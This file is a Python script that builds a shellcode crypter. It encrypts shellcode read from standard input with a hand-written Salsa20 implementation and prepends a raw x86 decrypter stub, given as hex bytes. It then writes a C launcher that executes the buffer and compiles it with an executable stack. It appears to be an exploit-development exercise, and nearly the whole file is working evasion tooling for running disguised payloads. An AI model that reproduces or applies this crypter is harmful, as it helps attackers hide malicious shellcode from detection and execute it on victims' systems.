#!/usr/bin/python3

import random
import os
import sys

def ROTATE(n, bits):
  return (n << bits) | (n >> (32-bits))

def PLUS(x,y):
  return (x+y)&0xffffffff

def XOR(x,y):
  return x^y

# Assumption: inputState is an array of 16 32 bit integers
def salsa20Core(inputState):
    print(inputState)
    x = list(inputState)
    for i in range(20,0,-2):
        x[ 4] = XOR(x[ 4],ROTATE(PLUS(x[ 0],x[12]), 7))
        x[ 8] = XOR(x[ 8],ROTATE(PLUS(x[ 4],x[ 0]), 9))
        x[12] = XOR(x[12],ROTATE(PLUS(x[ 8],x[ 4]),13))
        x[ 0] = XOR(x[ 0],ROTATE(PLUS(x[12],x[ 8]),18))
        x[ 9] = XOR(x[ 9],ROTATE(PLUS(x[ 5],x[ 1]), 7))
        x[13] = XOR(x[13],ROTATE(PLUS(x[ 9],x[ 5]), 9))
        x[ 1] = XOR(x[ 1],ROTATE(PLUS(x[13],x[ 9]),13))
        x[ 5] = XOR(x[ 5],ROTATE(PLUS(x[ 1],x[13]),18))
        x[14] = XOR(x[14],ROTATE(PLUS(x[10],x[ 6]), 7))
        x[ 2] = XOR(x[ 2],ROTATE(PLUS(x[14],x[10]), 9))
        x[ 6] = XOR(x[ 6],ROTATE(PLUS(x[ 2],x[14]),13))
        x[10] = XOR(x[10],ROTATE(PLUS(x[ 6],x[ 2]),18))
        x[ 3] = XOR(x[ 3],ROTATE(PLUS(x[15],x[11]), 7))
        x[ 7] = XOR(x[ 7],ROTATE(PLUS(x[ 3],x[15]), 9))
        x[11] = XOR(x[11],ROTATE(PLUS(x[ 7],x[ 3]),13))
        x[15] = XOR(x[15],ROTATE(PLUS(x[11],x[ 7]),18))
        x[ 1] = XOR(x[ 1],ROTATE(PLUS(x[ 0],x[ 3]), 7))
        x[ 2] = XOR(x[ 2],ROTATE(PLUS(x[ 1],x[ 0]), 9))
        x[ 3] = XOR(x[ 3],ROTATE(PLUS(x[ 2],x[ 1]),13))
        x[ 0] = XOR(x[ 0],ROTATE(PLUS(x[ 3],x[ 2]),18))
        x[ 6] = XOR(x[ 6],ROTATE(PLUS(x[ 5],x[ 4]), 7))
        x[ 7] = XOR(x[ 7],ROTATE(PLUS(x[ 6],x[ 5]), 9))
        x[ 4] = XOR(x[ 4],ROTATE(PLUS(x[ 7],x[ 6]),13))
        x[ 5] = XOR(x[ 5],ROTATE(PLUS(x[ 4],x[ 7]),18))
        x[11] = XOR(x[11],ROTATE(PLUS(x[10],x[ 9]), 7))
        x[ 8] = XOR(x[ 8],ROTATE(PLUS(x[11],x[10]), 9))
        x[ 9] = XOR(x[ 9],ROTATE(PLUS(x[ 8],x[11]),13))
        x[10] = XOR(x[10],ROTATE(PLUS(x[ 9],x[ 8]),18))
        x[12] = XOR(x[12],ROTATE(PLUS(x[15],x[14]), 7))
        x[13] = XOR(x[13],ROTATE(PLUS(x[12],x[15]), 9))
        x[14] = XOR(x[14],ROTATE(PLUS(x[13],x[12]),13))
        x[15] = XOR(x[15],ROTATE(PLUS(x[14],x[13]),18))
    for i in range(0,16):
        x[i] = PLUS(x[i],inputState[i]);
    print(x)
    return x

def salsa20_encrypt(state, message):
    msgLen = len(message)
    print(msgLen)
    if (msgLen == 0):
        return []
    j=0
    c = [0]*len(message)
    while(msgLen>0):
        output = salsa20Core(state)
        state = list(output)
        state[8] = PLUS(state[8],1)
        if (state[8] == 0):
            state[9] = PLUS(state[9],1)
        stateBytes = []
        for stateByte in state:
            stateBytes.extend(stateByte.to_bytes(4, byteorder="little"))
        print("Next round key:")
        for x in stateBytes:
            print("0x"+'{:02x}'.format(x) + " ", end='')
        print("\n")
        for i in range(0,64):
                # since output is in chunks of 4 bytes as ints
                if (i+j >= msgLen):
                    print("Early out")
                    print("i=" + str(i) + ", j="+str(j))
                    return c
                
                c[i+j] = chr((message[i+j])^stateBytes[i])
        j += 64
        print("one block done")
    print("Main return")
    return (c)        

def salsa20_decrypt(state, ciphertext):
    return salsa20_encrypt(state, ciphertext)

# Since this is for shellcode, it will only be used once for each key
# So just make everything random - key and iv and set it all up now
def initKeyAllRandom():
    return initKey(random.getrandbits(32),\
                   random.getrandbits(32),\
                   random.getrandbits(32),\
                   random.getrandbits(32),\
                   random.getrandbits(32),\
                   random.getrandbits(32),\
                   random.getrandbits(32),\
                   random.getrandbits(32),\
                   random.getrandbits(32),\
                   random.getrandbits(32),\
                   random.getrandbits(32),\
                   random.getrandbits(32))

def initKey(k1,k2,k3,k4,k5,k6,k7,k8,iv1,iv2,iv3,iv4):
    x = [0]*16
    # Salsa20 constants
    x[0]  = 0x61707865
    x[5]  = 0x3320646e
    x[10] = 0x79622d32
    x[15] = 0x6b206574

    # 256 bit key
    x[1]  = k1
    x[2]  = k2
    x[3]  = k3
    x[4]  = k4
    x[11] = k5
    x[12] = k6
    x[13] = k7
    x[14] = k8

    # IV (nonce)
    x[6] = iv1
    x[7] = iv2
    x[8] = iv3
    x[9] = iv4
    return x


initState = initKeyAllRandom()
#initState = initKey(0x31313131, 0x32323232, 0x33333333, 0x34343434,\
#                    0x35353535, 0x36363636, 0x37373737, 0x38383838,\
#                    0x41414141, 0x42424242, 0x43434343, 0x44444444)
currentState = list(initState)
keyString = ""
for s in currentState:
    kb = s.to_bytes(4, byteorder="little")
    for b in kb:
        keyString += "\\x"+'{:02x}'.format(b)

print(keyString)
# Shellcode payload to encode
with os.fdopen(sys.stdin.fileno(), 'rb') as shellcode_input:
    mainPayload = shellcode_input.read()

print(mainPayload)
print(len(mainPayload))
ciphertext = salsa20_encrypt(currentState, mainPayload)
#print(''.join(ciphertext))
print(len(ciphertext))
msgLen = len(ciphertext).to_bytes(2,byteorder="little")
messageLengthString = "\\x"+'{:02x}'.format(msgLen[0]) + "\\x" + '{:02x}'.format(msgLen[1])
msgLen15 = (len(ciphertext)+15).to_bytes(4,byteorder="little")
msgLen15String = "\\x"+'{:02x}'.format(msgLen15[0]) + "\\x" + '{:02x}'.format(msgLen15[1]) + "\\x"+'{:02x}'.format(msgLen15[2]) + "\\x" + '{:02x}'.format(msgLen15[3])
print("Ciphertext:")
ciphertextBytes = ""
for c in ciphertext:
    if c !=0:
      ciphertextBytes += "\\x"+'{:02x}'.format(ord(c))
print(ciphertextBytes)
#print("\n\nDecrypting:")
#currentState = list(initState)
#decryptedMsg = salsa20_decrypt(currentState, ciphertext)

#print(''.join(decryptedMsg))


decrypter1="\\xeb\\x03\\x5e\\xeb\\x4d\\xe8\\xf8\\xff\\xff\\xff"
#key=\x65\x78\x70\x61\x31\x31\x31\x31\x32\x32\x32\x32\x33\x33\x33\x33\x34\x34\x34\x34\x6e\x64\x20\x33\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44\x32\x2d\x62\x79\x35\x35\x35\x35\x36\x36\x36\x36\x37\x37\x37\x37\x38\x38\x38\x38\x74\x65\x20\x6b
decrypter2="\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\xeb\\x1d\\x5f\\x31\\xd2\\x66\\xba"
#length=\x65\x00
decrypter3="\\x52\\x57\\x56\\x90\\x90\\x90\\x90\\xe8"
#\\x7b\\x00\\x00\\x00 this is the offset over the shellcode, it is shellcode length +15
decrypter35="\\x90\\x90\\x90\\x90\\xff\\xd7\\x90\\x90\\x90\\x90\\xe8\\xde\\xff\\xff\\xff"
#ciphertext=\xb4\x7e\x80\x03\x8f\x6d\xbe\x43\xe7\xed\x2b\x6a\x40\x42\xf3\x15\xad\xec\x5b\x42\xdd\xc2\xc4\xd0\x4b\x94\x57\xfd\x0b\xd7\x57\x71\xbf\x23\xb9\xc0\x33\x62\xaa\x70\x34\x12\x35\xd8\x49\xff\x89\x93\x21\xa8\xb3\x77\xbb\x86\x8b\x09\xba\xd7\x8e\x3b\x7b\x4a\x71\xb9\xad\x46\x9f\xcf\x76\xd3\xea\x5d\xdb\xe8\xed\x93\xfa\xa9\xef\xaf\x41\x84\xdf\xa1\xf8\x10\x5f\x48\x2c\x0d\x24\xec\x74\x50\x3a\xc5\xef\xd7\x46\x08\x9f
decrypter4="\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x55\\x89\\xe5\\x50\\x53\\x51\\x52\\x8b\\x75\\x08\\x8b\\x7d\\x0c\\x31\\xc0\\x31\\xdb\\x56\\xe8\\x58\\x00\\x00\\x00\\x83\\xc4\\x04\\x8b\\x5e\\x20\\x43\\x89\\x5e\\x20\\x83\\xfb\\x00\\x75\\x07\\x8b\\x5e\\x24\\x43\\x89\\x5e\\x24\\x8b\\x5d\\x10\\x66\\x83\\xfb\\x40\\x7d\\x04\\x89\\xd9\\xeb\\x06\\x31\\xc9\\x66\\xb9\\x40\\x00\\x50\\x51\\xc1\\xe0\\x06\\x89\\xc2\\x01\\xca\\x31\\xdb\\x8a\\x5c\\x17\\xff\\x32\\x5c\\x0e\\xff\\x88\\x5c\\x17\\xff\\xe2\\xec\\x59\\x58\\x40\\x8b\\x5d\\x10\\x29\\xcb\\x89\\x5d\\x10\\x83\\xfb\\x00\\x7f\\xa8\\x5a\\x59\\x5b\\x58\\xc9\\xc3\\x55\\x89\\xe5\\x50\\x53\\x51\\x52\\x83\\xec\\x40\\x31\\xc9\\xb1\\x0f\\x8b\\x45\\x08\\x8b\\x1c\\x88\\x89\\x1c\\x8c\\x49\\x80\\xf9\\xff\\x75\\xf4\\x31\\xc9\\xb1\\x09\\x54\\xe8\\x27\\x00\\x00\\x00\\x49\\x80\\xf9\\xff\\x75\\xf5\\x83\\xc4\\x04\\x31\\xc9\\xb1\\x0f\\x8b\\x1c\\x8c\\x8b\\x14\\x88\\x01\\xda\\x89\\x14\\x88\\x49\\x80\\xf9\\xff\\x75\\xef\\x83\\xc4\\x40\\x5a\\x59\\x5b\\x58\\xc9\\xc3\\x55\\x89\\xe5\\x50\\x53\\x31\\xdb\\x8b\\x45\\x08\\x50\\x6a\\x07\\x6a\\x0c\\x53\\x6a\\x04\\xe8\\xf5\\x01\\x00\\x00\\x83\\xc4\\x10\\x6a\\x09\\x53\\x6a\\x04\\x6a\\x08\\xe8\\xe6\\x01\\x00\\x00\\x83\\xc4\\x10\\x6a\\x0d\\x6a\\x04\\x6a\\x08\\x6a\\x0c\\xe8\\xd6\\x01\\x00\\x00\\x83\\xc4\\x10\\x6a\\x12\\x6a\\x08\\x6a\\x0c\\x53\\xe8\\xc7\\x01\\x00\\x00\\x83\\xc4\\x10\\x6a\\x07\\x6a\\x01\\x6a\\x05\\x6a\\x09\\xe8\\xb7\\x01\\x00\\x00\\x83\\xc4\\x10\\x6a\\x09\\x6a\\x05\\x6a\\x09\\x6a\\x0d\\xe8\\xa7\\x01\\x00\\x00\\x83\\xc4\\x10\\x6a\\x0d\\x6a\\x09\\x6a\\x0d\\x6a\\x01\\xe8\\x97\\x01\\x00\\x00\\x83\\xc4\\x10\\x6a\\x12\\x6a\\x0d\\x6a\\x01\\x6a\\x05\\xe8\\x87\\x01\\x00\\x00\\x83\\xc4\\x10\\x6a\\x07\\x6a\\x06\\x6a\\x0a\\x6a\\x0e\\xe8\\x77\\x01\\x00\\x00\\x83\\xc4\\x10\\x6a\\x09\\x6a\\x0a\\x6a\\x0e\\x6a\\x02\\xe8\\x67\\x01\\x00\\x00\\x83\\xc4\\x10\\x6a\\x0d\\x6a\\x0e\\x6a\\x02\\x6a\\x06\\xe8\\x57\\x01\\x00\\x00\\x83\\xc4\\x10\\x6a\\x12\\x6a\\x02\\x6a\\x06\\x6a\\x0a\\xe8\\x47\\x01\\x00\\x00\\x83\\xc4\\x10\\x6a\\x07\\x6a\\x0b\\x6a\\x0f\\x6a\\x03\\xe8\\x37\\x01\\x00\\x00\\x83\\xc4\\x10\\x6a\\x09\\x6a\\x0f\\x6a\\x03\\x6a\\x07\\xe8\\x27\\x01\\x00\\x00\\x83\\xc4\\x10\\x6a\\x0d\\x6a\\x03\\x6a\\x07\\x6a\\x0b\\xe8\\x17\\x01\\x00\\x00\\x83\\xc4\\x10\\x6a\\x12\\x6a\\x07\\x6a\\x0b\\x6a\\x0f\\xe8\\x07\\x01\\x00\\x00\\x83\\xc4\\x10\\x6a\\x07\\x6a\\x03\\x53\\x6a\\x01\\xe8\\xf8\\x00\\x00\\x00\\x83\\xc4\\x10\\x6a\\x09\\x53\\x6a\\x01\\x6a\\x02\\xe8\\xe9\\x00\\x00\\x00\\x83\\xc4\\x10\\x6a\\x0d\\x6a\\x01\\x6a\\x02\\x6a\\x03\\xe8\\xd9\\x00\\x00\\x00\\x83\\xc4\\x10\\x6a\\x12\\x6a\\x02\\x6a\\x03\\x53\\xe8\\xca\\x00\\x00\\x00\\x83\\xc4\\x10\\x6a\\x07\\x6a\\x04\\x6a\\x05\\x6a\\x06\\xe8\\xba\\x00\\x00\\x00\\x83\\xc4\\x10\\x6a\\x09\\x6a\\x05\\x6a\\x06\\x6a\\x07\\xe8\\xaa\\x00\\x00\\x00\\x83\\xc4\\x10\\x6a\\x0d\\x6a\\x06\\x6a\\x07\\x6a\\x04\\xe8\\x9a\\x00\\x00\\x00\\x83\\xc4\\x10\\x6a\\x12\\x6a\\x07\\x6a\\x04\\x6a\\x05\\xe8\\x8a\\x00\\x00\\x00\\x83\\xc4\\x10\\x6a\\x07\\x6a\\x09\\x6a\\x0a\\x6a\\x0b\\xe8\\x7a\\x00\\x00\\x00\\x83\\xc4\\x10\\x6a\\x09\\x6a\\x0a\\x6a\\x0b\\x6a\\x08\\xe8\\x6a\\x00\\x00\\x00\\x83\\xc4\\x10\\x6a\\x0d\\x6a\\x0b\\x6a\\x08\\x6a\\x09\\xe8\\x5a\\x00\\x00\\x00\\x83\\xc4\\x10\\x6a\\x12\\x6a\\x08\\x6a\\x09\\x6a\\x0a\\xe8\\x4a\\x00\\x00\\x00\\x83\\xc4\\x10\\x6a\\x07\\x6a\\x0e\\x6a\\x0f\\x6a\\x0c\\xe8\\x3a\\x00\\x00\\x00\\x83\\xc4\\x10\\x6a\\x09\\x6a\\x0f\\x6a\\x0c\\x6a\\x0d\\xe8\\x2a\\x00\\x00\\x00\\x83\\xc4\\x10\\x6a\\x0d\\x6a\\x0c\\x6a\\x0d\\x6a\\x0e\\xe8\\x1a\\x00\\x00\\x00\\x83\\xc4\\x10\\x6a\\x12\\x6a\\x0d\\x6a\\x0e\\x6a\\x0f\\xe8\\x0a\\x00\\x00\\x00\\x83\\xc4\\x10\\x83\\xc4\\x04\\x5b\\x58\\xc9\\xc3\\x55\\x89\\xe5\\x50\\x53\\x51\\x8b\\x5d\\x0c\\x8b\\x45\\x18\\x8b\\x1c\\x98\\x8b\\x4d\\x10\\x8b\\x0c\\x88\\x01\\xcb\\x8b\\x4d\\x14\\xd3\\xc3\\x8b\\x4d\\x08\\x8b\\x0c\\x88\\x31\\xcb\\x8b\\x4d\\x08\\x89\\x1c\\x88\\x59\\x5b\\x58\\xc9\\xc3"


totalShellCode = decrypter1+keyString+decrypter2+messageLengthString+decrypter3+\
                 msgLen15String+decrypter35+ciphertextBytes+decrypter4


print("Total Shell Code:")
print("\""+totalShellCode+"\"")



preamble="#include <stdio.h>\n\
#include <string.h>\n\
#include <unistd.h>\n\
#include <stdlib.h>\n\
\n\
unsigned char shells[] =\n\
\""

mainBody="\"; \n\
\n\
int main(){\n\
		int (*ret)() = (int(*)())shells;\n\
		ret();\n\
}\n\
"

shellcodeFile = open("./shellcode.c", "w")
shellcodeFile.write(preamble+totalShellCode+mainBody)
shellcodeFile.close()

os.system("gcc -z execstack -o shellcode shellcode.c")
